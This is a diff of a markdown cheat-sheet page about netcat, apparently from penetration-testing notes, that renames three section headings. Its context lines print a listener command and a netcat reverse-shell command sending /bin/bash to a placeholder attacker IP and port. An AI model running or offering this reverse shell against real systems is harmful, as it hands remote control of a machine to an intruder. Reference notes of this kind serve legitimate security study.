@@ -6,21 +6,21 @@ description: A featured networking utility which reads and writes data across ne
 
 **[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)**
 
-## NETCAT Listener
+## Listener
 
 
  > 
  > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
  > Open a listener on delected port.
 
-## NETCAT Reverse Shell
+## Reverse Shell
 
 
  > 
  > **<font color=red>nc -e /bin/bash</font> \[ATTACKER_IP\] \[ATTACKER_PORT\]**</br>
  > Reverse shell. 
 
-## NETCAT Flags
+## Flags
 
 
  > 
